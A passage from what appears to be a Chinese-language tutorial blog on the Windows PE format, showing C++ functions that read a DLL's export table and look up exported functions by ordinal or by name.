pDataDirectory = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_EXPORT_DIRECTORY pExportDirectory = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">		pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class="line">		pNTHeader = (PIMAGE_NT_HEADERS64)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">		<span class="comment">//pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + sizeof(DWORD));</span></span><br><span class="line">		pOptionHeader = (PIMAGE_OPTIONAL_HEADER64)((BYTE *)pNTHeader + IMAGE_SIZEOF_FILE_HEADER + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD)); </span><br><span class="line">		<span class="comment">//pOptionHeader = &amp;pNTHeader-&gt;OptionalHeader;</span></span><br><span class="line">		pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pNTHeader-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">	</span><br><span class="line">		pDataDirectory = pOptionHeader-&gt;DataDirectory;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;DataDirectory[0].VirtualAddress：&quot;</span> &lt;&lt; hex &lt;&lt; pNTHeader-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">if</span>(pDataDirectory[<span class="number">0</span>].VirtualAddress == <span class="number">0</span>)&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;不存在导出表...&quot;</span> &lt;&lt; endl;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		DWORD ExportVirtualAddrRVA = pDataDirectory[<span class="number">0</span>].VirtualAddress;</span><br><span class="line">		<span class="comment">//ExportVirtualAddrRVA = 0x1060;</span></span><br><span class="line">		DWORD ExportVirtualAddrFOA = <span class="built_in">RVAToFOA</span>(ExportVirtualAddrRVA, pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;ExportVirtualAddrFOA = &quot;</span> &lt;&lt; ExportVirtualAddrFOA &lt;&lt; endl;</span><br><span class="line">	 </span><br><span class="line">		pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ExportVirtualAddrFOA + (DWORD)pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-----------IMAGE_EXPORT_DIRECTORY---------&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].VirtualAddress  = &quot;</span> &lt;&lt; ExportVirtualAddrRVA       &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].Size            = &quot;</span> &lt;&lt; pDataDirectory[<span class="number">0</span>].Size                &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Characteristics                   = &quot;</span> &lt;&lt; pExportDirectory-&gt;Characteristics      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;TimeDateStamp                     = &quot;</span> &lt;&lt; pExportDirectory-&gt;TimeDateStamp      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MajorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MajorVersion      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MinorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MinorVersion      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Name                  = &quot;</span> &lt;&lt; pExportDirectory-&gt;Name                   &lt;&lt; endl;</span><br><span class="line">		<span class="comment">//RVAToFOA(pExportDirectory-&gt;Name, pFileBuffer) 将指向Dll文件名的RVAToFOA</span></span><br><span class="line">		<span class="comment">//FOA + (DWORD)pFileBuffer即为Dll文件名的字符串</span></span><br><span class="line">		<span class="built_in">printf</span>(       <span class="string">&quot;Dll文件名             = %s\n&quot;</span>, <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;Name, pFileBuffer) + (DWORD)pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Base                  = &quot;</span> &lt;&lt; pExportDirectory-&gt;Base                   &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfFunctions     = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfFunctions      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfNames         = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfNames          &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfFunctions    = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfFunctions     &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNames        = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNames         &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNameOrdinals = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNameOrdinals  &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-FunctionsDetail-------------------------------------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-\t\t导出函数序号\t\tRVA\t\tFunctionName&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">		DWORD *AddrFunctions = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfFunctions, pFileBuffer));</span><br><span class="line">		DWORD *AddrName = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNames, pFileBuffer));</span><br><span class="line">		WORD  *AddrOrdinals = (WORD  *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNameOrdinals, pFileBuffer));</span><br><span class="line">		DWORD i = Ordinal - pExportDirectory-&gt;Base;</span><br><span class="line">		DWORD j = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; pExportDirectory-&gt;NumberOfNames; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(AddrOrdinals[j] == i)</span><br><span class="line">			&#123; </span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;导出序号 %x 对应的导出函数名为 %s ，该函数RVA为：%x\n&quot;</span>,Ordinal,<span class="built_in">RVAToFOA</span>(AddrName[j], pFileBuffer) + (DWORD)pFileBuffer,AddrFunctions[i]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> (PDWORD)AddrFunctions[i];</span><br><span class="line">	&#125;<span class="comment">//end	if(Is_64Bit)&#123;</span></span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_NT_HEADERS32 pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_DATA_DIRECTORY pDataDirectory = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_EXPORT_DIRECTORY pExportDirectory = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">		pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class="line">		pNTHeader = (PIMAGE_NT_HEADERS32)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">		<span class="comment">//pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + sizeof(DWORD));</span></span><br><span class="line">		pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((BYTE *)pNTHeader + IMAGE_SIZEOF_FILE_HEADER + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD)); </span><br><span class="line">		<span class="comment">//pOptionHeader = &amp;pNTHeader-&gt;OptionalHeader;</span></span><br><span class="line">		pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pNTHeader-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">	</span><br><span class="line">		pDataDirectory = pOptionHeader-&gt;DataDirectory;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;DataDirectory[0].VirtualAddress：&quot;</span> &lt;&lt; hex &lt;&lt; pNTHeader-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">if</span>(pDataDirectory[<span class="number">0</span>].VirtualAddress == <span class="number">0</span>)&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;不存在导出表...&quot;</span> &lt;&lt; endl;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		DWORD ExportVirtualAddrRVA = pDataDirectory[<span class="number">0</span>].VirtualAddress;</span><br><span class="line">		<span class="comment">//ExportVirtualAddrRVA = 0x1060;</span></span><br><span class="line">		DWORD ExportVirtualAddrFOA = <span class="built_in">RVAToFOA</span>(ExportVirtualAddrRVA, pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;ExportVirtualAddrFOA = &quot;</span> &lt;&lt; ExportVirtualAddrFOA &lt;&lt; endl;</span><br><span class="line">	 </span><br><span class="line">		pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ExportVirtualAddrFOA + (DWORD)pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-----------IMAGE_EXPORT_DIRECTORY---------&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].VirtualAddress  = &quot;</span> &lt;&lt; ExportVirtualAddrRVA       &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].Size            = &quot;</span> &lt;&lt; pDataDirectory[<span class="number">0</span>].Size                &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Characteristics                   = &quot;</span> &lt;&lt; pExportDirectory-&gt;Characteristics      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;TimeDateStamp                     = &quot;</span> &lt;&lt; pExportDirectory-&gt;TimeDateStamp      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MajorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MajorVersion      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MinorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MinorVersion      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Name                  = &quot;</span> &lt;&lt; pExportDirectory-&gt;Name                   &lt;&lt; endl;</span><br><span class="line">		<span class="comment">//RVAToFOA(pExportDirectory-&gt;Name, pFileBuffer) 将指向Dll文件名的RVAToFOA</span></span><br><span class="line">		<span class="comment">//FOA + (DWORD)pFileBuffer即为Dll文件名的字符串</span></span><br><span class="line">		<span class="built_in">printf</span>(       <span class="string">&quot;Dll文件名             = %s\n&quot;</span>, <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;Name, pFileBuffer) + (DWORD)pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Base                  = &quot;</span> &lt;&lt; pExportDirectory-&gt;Base                   &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfFunctions     = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfFunctions      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfNames         = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfNames          &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfFunctions    = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfFunctions     &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNames        = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNames         &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNameOrdinals = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNameOrdinals  &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-FunctionsDetail-------------------------------------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-\t\t导出函数序号\t\tRVA\t\tFunctionName&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">		DWORD *AddrFunctions = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfFunctions, pFileBuffer));</span><br><span class="line">		DWORD *AddrName = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNames, pFileBuffer));</span><br><span class="line">		WORD  *AddrOrdinals = (WORD  *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNameOrdinals, pFileBuffer));</span><br><span class="line">		DWORD i = Ordinal - pExportDirectory-&gt;Base;</span><br><span class="line">		DWORD j = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; pExportDirectory-&gt;NumberOfNames; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(AddrOrdinals[j] == i)</span><br><span class="line">			&#123; </span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;导出序号 %x 对应的导出函数名为 %s ，该函数RVA为：%x\n&quot;</span>,Ordinal,<span class="built_in">RVAToFOA</span>(AddrName[j], pFileBuffer) + (DWORD)pFileBuffer,AddrFunctions[i]);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">return</span> (PDWORD)AddrFunctions[i];</span><br><span class="line">	&#125;<span class="comment">//end else &#123;</span></span><br><span class="line"></span><br><span class="line">&#125;<span class="comment">//end GetFunctionAddrByOrdinals(PVOID pFileBuffer, DWORD Ordinal)</span></span><br></pre></td></tr></table></figure>



<h2 id="D-GetFunctionAddrByName"><a href="#D-GetFunctionAddrByName" class="headerlink" title="D GetFunctionAddrByName"></a>D GetFunctionAddrByName</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">根据导出函数名称，得到导出函数RVA</span></span><br><span class="line"><span class="comment">参数：该文件的FileBuffer，导出函数的名称</span></span><br><span class="line"><span class="comment">*****************************************************************************/</span></span><br><span class="line"><span class="function">PDWORD <span class="title">GetFunctionAddrByName</span><span class="params">(PVOID pFileBuffer, LPSTR Fun_Name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BOOL Is_64Bit = <span class="built_in">Is_64BitOS</span>(FILEPATH);</span><br><span class="line">	<span class="keyword">if</span>(Is_64Bit)</span><br><span class="line">	&#123;</span><br><span class="line">		PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_NT_HEADERS64 pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_OPTIONAL_HEADER64 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_DATA_DIRECTORY pDataDirectory = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_EXPORT_DIRECTORY pExportDirectory = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">		pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class="line">		pNTHeader = (PIMAGE_NT_HEADERS64)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">		<span class="comment">//pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + sizeof(DWORD));</span></span><br><span class="line">		pOptionHeader = (PIMAGE_OPTIONAL_HEADER64)((BYTE *)pNTHeader + IMAGE_SIZEOF_FILE_HEADER + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD)); </span><br><span class="line">		<span class="comment">//pOptionHeader = &amp;pNTHeader-&gt;OptionalHeader;</span></span><br><span class="line">		pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pNTHeader-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">	</span><br><span class="line">		pDataDirectory = pOptionHeader-&gt;DataDirectory;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;DataDirectory[0].VirtualAddress：&quot;</span> &lt;&lt; hex &lt;&lt; pNTHeader-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">if</span>(pDataDirectory[<span class="number">0</span>].VirtualAddress == <span class="number">0</span>)&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;不存在导出表...&quot;</span> &lt;&lt; endl;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		DWORD ExportVirtualAddrRVA = pDataDirectory[<span class="number">0</span>].VirtualAddress;</span><br><span class="line">		<span class="comment">//ExportVirtualAddrRVA = 0x1060;</span></span><br><span class="line">		DWORD ExportVirtualAddrFOA = <span class="built_in">RVAToFOA</span>(ExportVirtualAddrRVA, pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;ExportVirtualAddrFOA = &quot;</span> &lt;&lt; ExportVirtualAddrFOA &lt;&lt; endl;</span><br><span class="line">	 </span><br><span class="line">		pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ExportVirtualAddrFOA + (DWORD)pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-----------IMAGE_EXPORT_DIRECTORY---------&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].VirtualAddress  = &quot;</span> &lt;&lt; ExportVirtualAddrRVA       &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].Size            = &quot;</span> &lt;&lt; pDataDirectory[<span class="number">0</span>].Size                &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Characteristics                   = &quot;</span> &lt;&lt; pExportDirectory-&gt;Characteristics      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;TimeDateStamp                     = &quot;</span> &lt;&lt; pExportDirectory-&gt;TimeDateStamp      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MajorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MajorVersion      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MinorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MinorVersion      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Name                  = &quot;</span> &lt;&lt; pExportDirectory-&gt;Name                   &lt;&lt; endl;</span><br><span class="line">		<span class="comment">//RVAToFOA(pExportDirectory-&gt;Name, pFileBuffer) 将指向Dll文件名的RVAToFOA</span></span><br><span class="line">		<span class="comment">//FOA + (DWORD)pFileBuffer即为Dll文件名的字符串</span></span><br><span class="line">		<span class="built_in">printf</span>(       <span class="string">&quot;Dll文件名             = %s\n&quot;</span>, <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;Name, pFileBuffer) + (DWORD)pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Base                  = &quot;</span> &lt;&lt; pExportDirectory-&gt;Base                   &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfFunctions     = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfFunctions      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;NumberOfNames         = &quot;</span> &lt;&lt; pExportDirectory-&gt;NumberOfNames          &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfFunctions    = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfFunctions     &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNames        = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNames         &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;AddressOfNameOrdinals = &quot;</span> &lt;&lt; pExportDirectory-&gt;AddressOfNameOrdinals  &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-FunctionsDetail-------------------------------------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-\t\t导出函数序号\t\tRVA\t\tFunctionName&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">		DWORD *AddrFunctions = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfFunctions, pFileBuffer));</span><br><span class="line">		DWORD *AddrName = (DWORD *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNames, pFileBuffer));</span><br><span class="line">		WORD  *AddrOrdinals = (WORD  *)((DWORD)pFileBuffer + <span class="built_in">RVAToFOA</span>(pExportDirectory-&gt;AddressOfNameOrdinals, pFileBuffer));</span><br><span class="line">		DWORD i = <span class="number">0</span>;</span><br><span class="line">		DWORD j = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		DWORD a = (DWORD)Fun_Name;</span></span><br><span class="line"><span class="comment">		LPSTR* c = &amp;Fun_Name;</span></span><br><span class="line"><span class="comment">		DWORD b = RVAToFOA(AddrName[j], pFileBuffer) + (DWORD)pFileBuffer;</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%x\n&quot;,Fun_Name);//输出Fun_Name中的值，即字符串的地址</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%p\n&quot;,Fun_Name);//输出Fun_Name中的值，而非Fun_Name地址，即字符串的地址</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%p\n&quot;,c);</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%x\n&quot;,b);</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%s\n&quot;,b);//将b的整数作为地址去找该地址指向的内容</span></span><br><span class="line"><span class="comment">		printf(&quot;Fun_Name地址：%s\n&quot;,Fun_Name);//输出同上一行</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		<span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; pExportDirectory-&gt;NumberOfNames; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(!<span class="built_in">strcmp</span>((LPSTR)<span class="built_in">RVAToFOA</span>(AddrName[j], pFileBuffer) + (DWORD)pFileBuffer,Fun_Name))</span><br><span class="line">			&#123; </span><br><span class="line">				i = AddrOrdinals[j];</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;导出序号0x%x 对应的导出函数名为 %s ，该函数RVA为：%x\n&quot;</span>,AddrOrdinals[j] + pExportDirectory-&gt;Base,<span class="built_in">RVAToFOA</span>(AddrName[j], pFileBuffer) + (DWORD)pFileBuffer,AddrFunctions[i]);</span><br><span class="line">				<span class="keyword">return</span> (PDWORD)AddrFunctions[i];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;不存在该导出函数\n&quot;</span>);</span><br><span class="line">	<span class="comment">//return (PDWORD)AddrFunctions[i];</span></span><br><span class="line">	&#125;<span class="comment">//end	if(Is_64Bit)&#123;</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_NT_HEADERS32 pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_DATA_DIRECTORY pDataDirectory = <span class="literal">NULL</span>;</span><br><span class="line">		PIMAGE_EXPORT_DIRECTORY pExportDirectory = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">		pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class="line">		pNTHeader = (PIMAGE_NT_HEADERS32)((DWORD)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">		<span class="comment">//pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + sizeof(DWORD));</span></span><br><span class="line">		pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((BYTE *)pNTHeader + IMAGE_SIZEOF_FILE_HEADER + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD)); </span><br><span class="line">		<span class="comment">//pOptionHeader = &amp;pNTHeader-&gt;OptionalHeader;</span></span><br><span class="line">		pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pNTHeader-&gt;FileHeader.SizeOfOptionalHeader);</span><br><span class="line">	</span><br><span class="line">		pDataDirectory = pOptionHeader-&gt;DataDirectory;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;DataDirectory[0].VirtualAddress：&quot;</span> &lt;&lt; hex &lt;&lt; pNTHeader-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">if</span>(pDataDirectory[<span class="number">0</span>].VirtualAddress == <span class="number">0</span>)&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;不存在导出表...&quot;</span> &lt;&lt; endl;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		DWORD ExportVirtualAddrRVA = pDataDirectory[<span class="number">0</span>].VirtualAddress;</span><br><span class="line">		<span class="comment">//ExportVirtualAddrRVA = 0x1060;</span></span><br><span class="line">		DWORD ExportVirtualAddrFOA = <span class="built_in">RVAToFOA</span>(ExportVirtualAddrRVA, pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;ExportVirtualAddrFOA = &quot;</span> &lt;&lt; ExportVirtualAddrFOA &lt;&lt; endl;</span><br><span class="line">	 </span><br><span class="line">		pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(ExportVirtualAddrFOA + (DWORD)pFileBuffer);</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;-----------IMAGE_EXPORT_DIRECTORY---------&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].VirtualAddress  = &quot;</span> &lt;&lt; ExportVirtualAddrRVA       &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;pDataDirectory[0].Size            = &quot;</span> &lt;&lt; pDataDirectory[<span class="number">0</span>].Size                &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Characteristics                   = &quot;</span> &lt;&lt; pExportDirectory-&gt;Characteristics      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;TimeDateStamp                     = &quot;</span> &lt;&lt; pExportDirectory-&gt;TimeDateStamp      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MajorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MajorVersion      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;MinorVersion                      = &quot;</span> &lt;&lt; pExportDirectory-&gt;MinorVersion      &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; hex &lt;&lt; <span class="string">&quot;Name                  = &quot;</span> &lt;&lt; 